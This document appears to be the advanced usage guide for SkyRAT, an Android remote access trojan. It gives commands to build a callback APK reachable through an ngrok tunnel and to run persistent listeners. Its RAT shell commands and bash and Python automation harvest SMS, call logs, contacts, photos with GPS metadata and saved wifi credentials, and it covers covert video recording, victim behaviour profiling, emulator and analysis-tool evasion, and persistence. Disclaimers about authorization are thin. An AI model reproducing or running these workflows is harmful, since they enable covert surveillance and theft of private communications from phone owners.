# SkyRAT Advanced Features & Usage

Advanced examples and techniques for experienced security researchers using SkyRAT.

## 🎯 Prerequisites

- ✅ Completed [Basic Usage Examples](basic-usage.md)
- ✅ Advanced Android security knowledge
- ✅ Network security understanding
- ✅ Authorized testing environment

## 🚀 Advanced Deployment Scenarios

### **Scenario 1: External Access with Ngrok**

Deploy SkyRAT for remote testing through secure tunnels.

#### **Setup Ngrok Tunnel**
```bash
# Register at ngrok.com and get auth token
ngrok authtoken YOUR_AUTH_TOKEN

# Build APK with automatic ngrok tunnel
python3 skyrat.py --build --ngrok -p 8000 -o remote-test.apk

# Output shows:
# Ngrok tunnel: tcp://2.tcp.ngrok.io:12345
# APK will connect to external address
```

#### **Advanced Ngrok Configuration**
```bash
# Custom ngrok configuration file (~/.ngrok2/ngrok.yml)
authtoken: YOUR_AUTH_TOKEN
tunnels:
  skyrat:
    proto: tcp
    addr: 8000
    region: us
    metadata: "SkyRAT Security Testing"

# Use custom configuration
ngrok start skyrat
```

#### **Security Considerations**
- Ngrok provides encrypted tunnels
- Monitor ngrok dashboard for connections
- Use strong authentication mechanisms
- Limit tunnel duration for security

### **Scenario 2: Multi-Device Management**

Manage multiple test devices simultaneously.

#### **Server Setup for Multiple Connections**
```bash
# Server supports concurrent connections
python3 skyrat.py --shell -i 0.0.0.0 -p 8000

# Each device appears as separate session
# Device 1: 192.168.1.45:54321
# Device 2: 192.168.1.46:54322
```

#### **Device Identification Strategy**
```bash
# Label APKs by purpose
python3 skyrat.py --build -i IP -p 8000 -o device1-android11.apk --app-name "Test Device 1"
python3 skyrat.py --build -i IP -p 8001 -o device2-android13.apk --app-name "Test Device 2"

# Use different ports for organization
# Device 1: Port 8000
# Device 2: Port 8001
```

### **Scenario 3: Persistent Testing Environment**

Set up long-term testing infrastructure.

#### **Automated APK Building**
```bash
# Create build script for multiple configurations
#!/bin/bash
# build-test-suite.sh

declare -A devices=(
    ["android11"]="192.168.1.100:8000"
    ["android12"]="192.168.1.101:8001" 
    ["android13"]="192.168.1.102:8002"
)

for device in "${!devices[@]}"; do
    IFS=':' read -r ip port <<< "${devices[$device]}"
    python3 skyrat.py --build -i "$ip" -p "$port" -o "${device}-test.apk" --app-name "Test $device"
done
```

#### **Persistent Server Management**
```bash
# Run server in background with logging
nohup python3 skyrat.py --shell -i 0.0.0.0 -p 8000 > skyrat.log 2>&1 &

# Monitor connections
tail -f skyrat.log

# Server management
ps aux | grep skyrat
kill -TERM $(pidof python3)
```

## 🔬 Advanced Data Analysis

### **Comprehensive Device Profiling**

Extract detailed device fingerprints for security analysis.

#### **System Fingerprinting**
```bash
# Detailed system analysis
SkyRAT:/> shell cat /proc/version
SkyRAT:/> shell cat /proc/cpuinfo
SkyRAT:/> shell cat /proc/meminfo
SkyRAT:/> shell getprop | grep -E "(model|version|fingerprint)"

# Security analysis
SkyRAT:/> shell cat /proc/config.gz | gunzip | grep -E "(SELINUX|SECURITY)"
SkyRAT:/> shell getenforce  # SELinux status
SkyRAT:/> shell ls -la /system/xbin/  # Check for su binary
```

#### **Network Profiling**
```bash
# Advanced network analysis
SkyRAT:/> shell cat /proc/net/arp
SkyRAT:/> shell netstat -tuln
SkyRAT:/> shell ss -tulpn
SkyRAT:/> shell cat /proc/net/route

# WiFi analysis
SkyRAT:/> shell dumpsys wifi | grep -E "(SSID|BSSID|frequency)"
SkyRAT:/> shell iwconfig
```

#### **Application Security Analysis**
```bash
# Detailed app analysis
SkyRAT:/> shell pm list packages -f | head -20
SkyRAT:/> shell dumpsys package com.android.chrome | grep -E "(permission|signature)"

# Check for debugging
SkyRAT:/> shell getprop ro.debuggable
SkyRAT:/> shell getprop ro.secure

# Root detection bypass analysis
SkyRAT:/> shell ls -la /system/app/ | grep -i "root\|super"
SkyRAT:/> shell which su
```

### **Communication Pattern Analysis**

Advanced analysis of communication data.

#### **SMS Pattern Analysis**
```bash
# Extract and analyze SMS patterns
SkyRAT:/> getSMS inbox
SkyRAT:/> getSMS sent

# Post-processing analysis (on server)
# Parse timestamps for communication patterns
python3 -c "
import re
from datetime import datetime

with open('dumps/inbox_SMS_latest.txt', 'r') as f:
    content = f.read()
    
# Extract timestamps and analyze patterns
timestamps = re.findall(r'Date: (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', content)
hours = [datetime.strptime(ts, '%Y-%m-%d %H:%M:%S').hour for ts in timestamps]

# Activity pattern analysis
activity = {}
for hour in hours:
    activity[hour] = activity.get(hour, 0) + 1
    
print('SMS Activity by Hour:')
for hour in sorted(activity.keys()):
    print(f'{hour:02d}:00 - {activity[hour]} messages')
"
```

#### **Call Pattern Analysis**
```bash
# Advanced call log analysis
SkyRAT:/> getCallLogs

# Frequency analysis
python3 -c "
import re
from collections import Counter

with open('dumps/Call_Logs_latest.txt', 'r') as f:
    content = f.read()

# Extract phone numbers
numbers = re.findall(r'Number: ([+\d\-\(\)]+)', content)
frequency = Counter(numbers)

print('Top 10 Most Called Numbers:')
for number, count in frequency.most_common(10):
    print(f'{number}: {count} calls')
"
```

### **Media Forensics**

Advanced media file analysis and extraction.

#### **Photo Metadata Analysis**
```bash
# Extract photo metadata
SkyRAT:/> getPhotos

# Download recent photos for analysis
SkyRAT:/> ls /sdcard/DCIM/Camera/
SkyRAT:/> download /sdcard/DCIM/Camera/IMG_20240315_120000.jpg

# Extract EXIF data (server-side)
exiftool dumps/Downloaded_*_IMG_*.jpg | grep -E "(GPS|Date|Camera|Location)"
```

#### **Advanced Recording Techniques**
```bash
# Long-duration recording with monitoring
SkyRAT:/> startVideo 0

# Monitor recording status (in separate session)
SkyRAT:/> shell ps aux | grep media
SkyRAT:/> shell df -h  # Monitor storage

# Schedule recording stop (server-side)
sleep 300 && echo "stopVideo" | nc localhost 8000
```

## 🛠️ Automation and Scripting

### **Automated Data Collection**

Create scripts for systematic data collection.

#### **Comprehensive Data Collection Script**
```bash
#!/bin/bash
# collect-all-data.sh

DEVICE_SESSION="skyrat_session"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="assessment_${TIMESTAMP}"

mkdir -p "$OUTPUT_DIR"

# Function to send command and save output
send_command() {
    local cmd="$1"
    local output_file="$2"
    echo "Executing: $cmd"
    echo "$cmd" | nc localhost 8000 > "$OUTPUT_DIR/$output_file"
    sleep 2
}

# Device profiling
send_command "deviceInfo" "device_info.txt"
send_command "getIP" "network_info.txt"
send_command "sysinfo" "system_info.txt"

# Communication data
send_command "getSMS inbox" "sms_inbox.txt"
send_command "getSMS sent" "sms_sent.txt"
send_command "getCallLogs" "call_logs.txt"
send_command "getContacts" "contacts.txt"

# Application analysis
send_command "getApps" "applications.txt"
send_command "ps" "processes.txt"

# File system analysis
send_command "ls /sdcard" "sdcard_listing.txt"
send_command "ls /system/app" "system_apps.txt"

echo "Data collection complete: $OUTPUT_DIR"
```

#### **Python Automation Framework**
```python
#!/usr/bin/env python3
# skyrat_automation.py

import socket
import time
import json
from datetime import datetime

class SkyRATAutomation:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        
    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        # Wait for welcome message
        self.receive_response()
        
    def send_command(self, command):
        if self.socket:
            self.socket.send(f"{command}\n".encode())
            return self.receive_response()
            
    def receive_response(self):
        response = ""
        while "END123" not in response:
            data = self.socket.recv(8192).decode('utf-8', errors='ignore')
            response += data
        return response.replace("END123", "").strip()
        
    def collect_all_data(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results = {"timestamp": timestamp, "data": {}}
        
        commands = [
            "deviceInfo", "getIP", "sysinfo",
            "getSMS inbox", "getCallLogs", "getContacts",
            "getApps", "ps"
        ]
        
        for cmd in commands:
            print(f"Executing: {cmd}")
            results["data"][cmd] = self.send_command(cmd)
            time.sleep(2)
            
        # Save results
        with open(f"automated_collection_{timestamp}.json", "w") as f:
            json.dump(results, f, indent=2)
            
        return results
        
    def disconnect(self):
        if self.socket:
            self.send_command("exit")
            self.socket.close()

# Usage example
if __name__ == "__main__":
    automation = SkyRATAutomation("localhost", 8000)
    automation.connect()
    results = automation.collect_all_data()
    automation.disconnect()
    print("Automated collection complete")
```

### **Continuous Monitoring**

Set up continuous monitoring for long-term assessments.

#### **Device Monitoring Script**
```bash
#!/bin/bash
# monitor_device.sh

LOGFILE="device_monitor_$(date +%Y%m%d).log"

while true; do
    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Check device connectivity
    if nc -z localhost 8000; then
        echo "[$TIMESTAMP] Device connected" >> "$LOGFILE"
        
        # Collect periodic data
        echo "sysinfo" | nc localhost 8000 | grep -E "(Memory|Storage)" >> "$LOGFILE"
        echo "ps" | nc localhost 8000 | wc -l >> "$LOGFILE"
        
    else
        echo "[$TIMESTAMP] Device disconnected" >> "$LOGFILE"
    fi
    
    sleep 300  # Check every 5 minutes
done
```

## 🔐 Advanced Security Testing

### **Android Security Mechanism Testing**

Test various Android security features and restrictions.

#### **Permission Escalation Testing**
```bash
# Test permission boundaries
SkyRAT:/> shell ls -la /data/data/
SkyRAT:/> shell cat /data/system/packages.xml
SkyRAT:/> shell ls -la /system/etc/permissions/

# Test accessibility service abuse
SkyRAT:/> shell dumpsys accessibility
SkyRAT:/> shell settings get secure accessibility_enabled

# Test device admin capabilities  
SkyRAT:/> shell dpm list-owners
SkyRAT:/> shell dumpsys device_policy
```

#### **Network Security Testing**
```bash
# Certificate analysis
SkyRAT:/> shell ls -la /system/etc/security/cacerts/
SkyRAT:/> download /system/etc/security/cacerts/[cert-file]

# Network configuration
SkyRAT:/> shell cat /data/misc/wifi/wpa_supplicant.conf
SkyRAT:/> shell dumpsys connectivity

# VPN analysis
SkyRAT:/> shell cat /proc/net/route | grep tun
SkyRAT:/> shell ip route show table all
```

#### **Application Sandbox Testing**
```bash
# Test app isolation
SkyRAT:/> shell run-as com.android.chrome ls -la
SkyRAT:/> shell ls -la /data/data/com.android.chrome/

# Shared storage access
SkyRAT:/> shell ls -la /sdcard/Android/data/
SkyRAT:/> shell ls -la /storage/emulated/0/Android/
```

### **Evasion and Stealth Testing**

Test detection evasion capabilities.

#### **Anti-Analysis Evasion**
```bash
# Check for analysis tools
SkyRAT:/> shell ps aux | grep -E "(frida|xposed|substrate)"
SkyRAT:/> shell ls -la /data/local/tmp/
SkyRAT:/> shell netstat -tulpn | grep -E "(23946|27042)"

# Emulator detection
SkyRAT:/> shell getprop ro.product.model | grep -i emulator
SkyRAT:/> shell cat /proc/cpuinfo | grep -i goldfish
SkyRAT:/> shell ls -la /system/bin/ | grep -E "(genymotion|bluestacks)"
```

#### **Persistence Mechanism Testing**
```bash
# Check persistence mechanisms
SkyRAT:/> shell dumpsys jobscheduler | grep skyrat
SkyRAT:/> shell dumpsys activity services | grep skyrat
SkyRAT:/> shell dumpsys alarm | grep skyrat

# Boot persistence
SkyRAT:/> shell dumpsys package com.techsky.skyrat | grep -A5 "receivers:"
```

## 📊 Advanced Data Analysis

### **Behavioral Analysis**

Analyze device usage patterns and behaviors.

#### **Usage Pattern Analysis**
```python
#!/usr/bin/env python3
# usage_analysis.py

import json
import matplotlib.pyplot as plt
from datetime import datetime
import re

def analyze_sms_patterns(sms_file):
    """Analyze SMS communication patterns"""
    with open(sms_file, 'r') as f:
        content = f.read()
    
    # Extract timestamps
    timestamps = re.findall(r'Date: (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', content)
    
    # Activity by hour
    hours = [datetime.strptime(ts, '%Y-%m-%d %H:%M:%S').hour for ts in timestamps]
    hour_counts = {h: hours.count(h) for h in range(24)}
    
    # Plot activity
    plt.figure(figsize=(12, 6))
    plt.bar(hour_counts.keys(), hour_counts.values())
    plt.title('SMS Activity by Hour')
    plt.xlabel('Hour of Day')
    plt.ylabel('Number of Messages')
    plt.savefig('sms_activity_pattern.png')
    
    return hour_counts

def analyze_app_usage(apps_file):
    """Analyze installed applications"""
    with open(apps_file, 'r') as f:
        content = f.read()
    
    # Extract app information
    apps = re.findall(r'Name: (.+?)\nPackage: (.+?)\nVersion: (.+?)\nType: (.+?)\n', content)
    
    # Categorize apps
    categories = {'System': 0, 'User': 0}
    for _, _, _, app_type in apps:
        categories[app_type] = categories.get(app_type, 0) + 1
    
    # Security-relevant apps
    security_apps = [app for app in apps if any(keyword in app[0].lower() 
                    for keyword in ['security', 'antivirus', 'vpn', 'firewall'])]
    
    return {
        'total_apps': len(apps),
        'categories': categories,
        'security_apps': security_apps
    }

# Usage
if __name__ == "__main__":
    sms_patterns = analyze_sms_patterns('dumps/inbox_SMS_latest.txt')
    app_analysis = analyze_app_usage('dumps/Applications_latest.txt')
    
    print("SMS Activity Analysis:")
    for hour, count in sorted(sms_patterns.items()):
        if count > 0:
            print(f"  {hour:02d}:00 - {count} messages")
    
    print(f"\nApp Analysis:")
    print(f"  Total apps: {app_analysis['total_apps']}")
    print(f"  System apps: {app_analysis['categories'].get('System', 0)}")
    print(f"  User apps: {app_analysis['categories'].get('User', 0)}")
    print(f"  Security apps: {len(app_analysis['security_apps'])}")
```

### **Threat Intelligence Integration**

Integrate with threat intelligence for enhanced analysis.

#### **IOC Analysis Script**
```python
#!/usr/bin/env python3
# ioc_analysis.py

import re
import requests
import hashlib

def extract_indicators(data_files):
    """Extract indicators of compromise from collected data"""
    indicators = {
        'domains': set(),
        'ips': set(), 
        'urls': set(),
        'hashes': set()
    }
    
    for file_path in data_files:
        with open(file_path, 'r') as f:
            content = f.read()
            
        # Extract domains
        domains = re.findall(r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
        indicators['domains'].update(domains)
        
        # Extract IPs
        ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', content)
        indicators['ips'].update(ips)
        
        # Extract URLs
        urls = re.findall(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', content)
        indicators['urls'].update(urls)
    
    return indicators

def check_virustotal(indicator, api_key):
    """Check indicator against VirusTotal"""
    if not api_key:
        return None
        
    url = f"https://www.virustotal.com/vtapi/v2/url/report"
    params = {
        'apikey': api_key,
        'resource': indicator
    }
    
    try:
        response = requests.get(url, params=params)
        return response.json()
    except Exception as e:
        print(f"VirusTotal check failed: {e}")
        return None

# Usage example
indicators = extract_indicators(['dumps/Applications_latest.txt', 'dumps/network_info.txt'])
print("Extracted Indicators:")
for category, items in indicators.items():
    print(f"  {category}: {len(items)} items")
```

## 🚨 Security Considerations

### **Operational Security**
- Use isolated test environments
- Encrypt extracted data
- Implement secure communication channels
- Regular security updates

### **Legal Compliance**
- Maintain detailed authorization documentation
- Follow responsible disclosure practices
- Comply with data protection regulations
- Regular legal review of procedures

### **Technical Security**
- Secure server infrastructure
- Regular security assessments
- Incident response procedures
- Data retention policies

---

**These advanced examples demonstrate the full capabilities of SkyRAT for comprehensive Android security testing. Always ensure proper authorization and follow responsible security research practices.**